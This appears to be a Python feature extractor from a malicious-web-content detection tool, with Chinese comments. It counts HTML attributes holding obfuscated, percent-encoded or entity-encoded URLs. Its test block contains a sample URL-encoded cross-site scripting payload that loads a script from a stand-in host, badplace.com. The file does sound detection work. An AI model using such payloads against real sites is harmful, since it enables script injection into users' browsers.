from src.static_features.html import *
from src.utils.utils import ENCODED_URLS_AND_IPS

# encode--obfuscate


class EncodedURLHTML(HTMLExtractor):
    def __init__(self, web_data):
        super().__init__(web_data)
        self.meta = ExtractorMeta(
            "html",
            "EncodedURLHTML",
            "InfectedWebContent2017",
            "至少五个URL编码或HTML实体编码",
            "1.0",
        )

    def extract(self) -> FeatureExtractionResult:
        htmls = self.web_data.content["html"]
        info_dict = {}
        for h in htmls:
            start_time = time.time()
            res = extract(h["content"])
            info_dict[h["filename"]] = {
                "count": res,
                "time": time.time() - start_time,
                "additional_info": {},
            }
        return FeatureExtractionResult(self.meta.filetype, self.meta.name, info_dict)


def extract(html_content):
    # 定义正则表达式来匹配编码的URL：URL编码或HTML实体编码，至少五个
    pattern = re.compile(r"(%[0-9a-fA-F]{2}){5,}|(&#[0-9]+;){5,}")

    # 初始化编码URL的数量
    encoded_urls_count = 0

    soup = BeautifulSoup(html_content, "html.parser")

    # 定义需要检查的标签和属性
    # Q：这些并不全？为什么没有列得更全？
    # object 标签的 data 属性可以包含URL。 form 标签的 action 属性指定了表单提交的URL。 img 和 source 标签的 srcset 属性可以包含一个或多个URL，用于指定图片源。
    # a 和 area 标签的 ping 属性可以包含一个或多个URL，用于发送跟踪请求。 blockquote, q, del, ins 标签的 cite 属性可以包含引用资源的URL。
    # button 标签的 formaction 属性可以覆盖表单的 action URL。

    # 遍历定义的标签和属性
    for tag, attribute in ENCODED_URLS_AND_IPS:
        for element in soup.find_all(tag):
            # 对于meta标签，特别处理refresh类型
            if tag == "meta" and element.get("http-equiv", "").lower() != "refresh":
                continue

            # 提取属性值
            attr_value = element.get(attribute)
            if attr_value and pattern.search(attr_value):
                encoded_urls_count += 1

    return encoded_urls_count


if __name__ == "__main__":
    html_content = """
    http://target/getdata.php?data=%3cscript%20
    src=%22http%3a%2f%2fwww.badplace.com%2fnasty
    .js%22%3e%3c%2fscript%3e
    """

    score = extract(html_content)
    print("Encoded URL count:", score)
